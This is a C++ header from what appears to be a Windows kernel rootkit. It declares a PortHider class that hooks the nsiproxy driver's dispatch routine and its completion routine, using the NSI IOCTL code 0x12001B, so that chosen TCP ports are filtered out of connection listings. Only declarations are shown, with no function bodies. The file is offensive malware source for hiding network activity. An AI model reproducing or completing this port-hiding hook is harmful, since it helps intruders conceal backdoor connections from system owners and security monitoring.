#pragma once

#include <ntifs.h>

#include "../../lib/Symbols.h"
#include "../../lib/Vector.h"
#include "../../lib/Memory.h"

constexpr auto NSI_DRIVER_NAME = L"\\Driver\\nsiproxy";
constexpr ULONG IOCTL_NSI_GETALLPARAM = 0x12001B;
constexpr ULONG TCP = 0x38;

using HiddenPortsVector = Vector<USHORT, PagedPool, POOL_TAG>;

class PortHider
{
public:
	PortHider();

	static NTSTATUS hide();
	static NTSTATUS unhide();
	static void addHiddenPort(USHORT port);

private:
	static NTSTATUS hookedDeviceIoControl(PDEVICE_OBJECT deviceObject, PIRP irp);
	static NTSTATUS hookedCompletionRoutine(PDEVICE_OBJECT deviceObject, PIRP irp, PVOID context);
	static bool shouldHidePort(USHORT port);
	static USHORT htons(USHORT a);

	static HiddenPortsVector* m_hiddenPorts;
	static PDRIVER_OBJECT m_nsiDriver;
	static PDRIVER_DISPATCH m_nsiOriginalDispatch;
};
